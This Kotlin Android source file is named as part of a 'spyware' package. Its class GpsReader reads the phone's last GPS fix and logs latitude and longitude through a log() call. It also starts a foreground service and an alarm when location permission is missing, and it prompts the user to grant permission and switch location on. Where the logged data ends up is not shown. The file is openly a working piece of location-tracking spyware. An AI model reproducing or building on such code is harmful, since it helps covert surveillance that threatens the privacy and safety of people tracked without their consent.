package com.example.spyware

import android.Manifest
import android.app.Activity
import android.app.ActivityManager
import android.app.AlertDialog
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.IntentSender
import android.content.pm.PackageManager
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import com.google.android.gms.location.LocationRequest
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import android.os.Looper
import android.provider.Settings
import androidx.core.content.ContextCompat.startActivity
import com.example.spyware.common.Constants.Companion.ERROR
import com.example.spyware.common.Constants.Companion.LATITUDE
import com.example.spyware.common.Constants.Companion.LONGITUDE
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.location.SettingsClient
import log
import org.json.JSONObject

class GpsReader(private val context: Context) {
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var mobileDialogOpen=false
    private lateinit var locationRequest: LocationRequest
    private lateinit var settingsClient: SettingsClient
    private val REQUEST_CHECK_SETTINGS = 1001

    public fun getLastLocation() {
        println("GetLastLocation invoked")
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)

        //Requesting user permission to access fine location
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED ) {
            startMainActivity()
            TimeoutHandler(context).alarm()
            return
        }

        fusedLocationClient.lastLocation
            .addOnSuccessListener { location: Location? ->
                location?.let {
                    val latitude = it.latitude
                    val longitude = it.longitude
                    log(context, JSONObject().put(LATITUDE,latitude).put(LONGITUDE,longitude))
//                    println("GPS Lat: $latitude Lon: $longitude")
                } ?: run {
                    log(context, JSONObject().put(ERROR,"Unable to read location data"))

//                    requestLocationUpdates()
//                    showEnableMobileDataDialog(context)
//                    LocationService.startMainActivity()
                    startMainActivity()
                    TimeoutHandler(context).alarm()
                }
            }
    }

    fun startMainActivity(){
        context.startForegroundService(
            Intent(
                context,
                NotificationService::class.java
            )
        );

    }

    fun grantLocationPermission(activity:Activity){
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED ) {
            ActivityCompat.requestPermissions(
                activity,
                arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION),
                REQUEST_CHECK_SETTINGS
            )
            return
        }

    }

    fun turnOnLocation(activity:Activity){
        // Step 1: Create location request
        locationRequest = LocationRequest.create().apply {
            priority = Priority.PRIORITY_HIGH_ACCURACY
        }

        val builder = LocationSettingsRequest.Builder()
            .addLocationRequest(locationRequest)
            .setAlwaysShow(true)

        settingsClient = LocationServices.getSettingsClient(context)

        // Step 2: Check location settings
        settingsClient.checkLocationSettings(builder.build())
            .addOnSuccessListener {
                // Location is already enabled
                // Proceed with location-dependent logic
//                this.getLastLocation()
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        // Step 3: Prompt user to turn on location
                        exception.startResolutionForResult(activity, REQUEST_CHECK_SETTINGS)
                    } catch (sendEx: IntentSender.SendIntentException) {
                        // Handle error
                        sendEx.printStackTrace()
                    }
                }
            }

    }

//    private fun requestLocationUpdates() {
//        val locationRequest = LocationRequest.Builder(
//            Priority.PRIORITY_HIGH_ACCURACY, // priority
//            10000L                           // interval in ms
//        ).apply {
//            setMinUpdateIntervalMillis(5000L) // optional: minimum time between updates
//        }.build()
//        val locationCallback = object : LocationCallback() {
//            override fun onLocationResult(locationResult: LocationResult) {
//                val location = locationResult.lastLocation
//                if (location != null) {
//                    val latitude = location.latitude
//                    val longitude = location.longitude
//                    println("GPS Updated Lat: $latitude, Lon: $longitude")
//                    fusedLocationClient.removeLocationUpdates(this)
//                }
//            }
//        }
//
//        fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
//    }
//    private fun requestLocationUpdates() {
//        val request = LocationRequest.create().apply {
//            interval = 10000
//            fastestInterval = 5000
//            priority = Priority.PRIORITY_HIGH_ACCURACY
//        }
//
//        fusedLocationClient.requestLocationUpdates(request, getPendingIntent())
//    }
//
//    private fun getPendingIntent(): PendingIntent {
//        val intent = Intent(context, LocationReceiver::class.java)
//        return PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
//    }

}